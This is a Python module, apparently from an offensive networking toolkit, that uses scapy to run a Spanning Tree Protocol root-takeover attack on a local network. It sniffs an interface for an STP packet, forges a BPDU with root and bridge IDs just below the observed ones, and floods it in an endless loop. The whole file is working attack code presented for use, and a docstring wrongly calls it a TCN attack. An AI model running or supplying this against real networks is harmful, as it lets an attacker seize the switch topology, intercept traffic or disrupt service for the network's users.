import logging
logging.getLogger("scapy.runtime").setLevel(logging.WARNING)

from scapy.layers.l2 import LLC, STP, Dot3
from scapy.all import sendp,sniff,get_if_hwaddr



def run(interface):
    """
    This function launch STP TCN ATTACK
    :param interface: interface to be launched the attack
    :type interface: str
    """
    # sniff to found a stp packet
    pkt = sniff(stop_filter=lambda x: x.haslayer(STP), iface=interface)

    # Look for a STP packet to use a lower priority
    pk_list={x:y for x,y in pkt.sessions().iteritems() if "Other" in x}
    item=pk_list.popitem()
    pkts = item[1]


    for x in pkts:
        if STP in x:
            STP_packet = x
            break

    myMAC = get_if_hwaddr(interface)

    root_id = STP_packet.rootid - 1
    
    bridge_id = STP_packet.bridgeid - 1

    p_ether = Dot3(dst="01:80:c2:00:00:00", src=myMAC)
    p_llc = LLC()

    p_stp = STP(bpdutype=0x00, bpduflags=0x01, portid=0x8002, rootmac=myMAC, bridgemac=myMAC,
                rootid=root_id, bridgeid=bridge_id)

    pkt = p_ether/p_llc/p_stp   # STP packet structure

    try:
        while 1:
            sendp(pkt, iface=interface, verbose=0)
    except KeyboardInterrupt:
        pass




def run_attack(config):
    """ This function is used for launch the STP ROOT ROLE attack
    :param config: GlobalParameters option instance
    :type config: `GlobalParameters`

    """
    run(config.interface[0])